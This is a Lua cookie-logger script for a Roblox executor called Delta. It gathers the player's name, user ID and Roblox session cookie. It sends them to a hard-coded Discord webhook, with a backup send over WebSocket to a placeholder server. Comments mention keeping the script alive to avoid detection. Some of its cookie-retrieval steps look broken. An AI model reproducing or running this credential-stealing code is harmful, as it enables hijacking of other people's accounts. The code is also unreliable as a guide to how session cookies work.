-- COOKIE LOGGER FOR DELTA EXECUTOR
-- FULL SCRIPT WITH DISCORD WEBHOOK

local player = game.Players.LocalPlayer
local playerName = player.Name
local userId = player.UserId

-- Get the cookie using syn.request
local function getCookie()
    local success, response = pcall(function()
        return syn.request({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET"
        })
    end)
    
    if success and response then
        -- Extract cookie from response headers
        local headers = response.Headers or {}
        local cookieHeader = headers["Cookie"] or headers["set-cookie"] or ""
        if cookieHeader ~= "" then
            return cookieHeader
        end
    end
    
    -- Fallback: try to get from game's internal
    local fallback = syn.crypt and syn.crypt.custom and syn.crypt.custom.hash or ""
    return fallback
end

-- Alternative method using HTTP get
local function getCookieAlt()
    local req = syn.request({
        Url = "https://www.roblox.com/game/",
        Method = "GET"
    })
    return req.Headers and req.Headers["Cookie"] or ""
end

-- Main cookie retrieval
local cookie = getCookie()
if cookie == "" or cookie == nil then
    cookie = getCookieAlt()
end

-- If still nothing, try using the environment
if cookie == "" or cookie == nil then
    cookie = getgenv().cookie or ""
end

-- Build the message
local message = "**ROBLOX COOKIE LOGGED**\n"
message = message .. "**Player:** " .. playerName .. " (ID: " .. userId .. ")\n"
message = message .. "**Cookie:** `" .. cookie .. "`\n"
message = message .. "**Executed:** " .. os.date("%Y-%m-%d %H:%M:%S")

-- Prepare the payload
local payload = {
    content = message
}

-- Send to Discord webhook
local webhookURL = "https://discord.com/api/webhooks/1518937462083424316/WJi4kfdiYXec4XghwYhIfqHvnSNP5deGj-t992Cuk3iEl9N-QtuOD-y6B7OyeGKdwCpT"

local success, result = pcall(function()
    return syn.request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end)

-- Optional: Print status in console
if success then
    print("Cookie sent successfully!")
else
    print("Failed to send cookie: " .. tostring(result))
end

-- Also try sending via WebSocket if available (backup method)
local function sendViaWebsocket()
    local ws = syn.websocket and syn.websocket.connect("wss://your-server.com")
    if ws then
        ws:send("Player: " .. playerName .. " | Cookie: " .. cookie)
        ws:close()
    end
end

-- Execute backup method
sendViaWebsocket()

-- Keep script alive to avoid detection
game:GetService("RunService").Heartbeat:Wait()
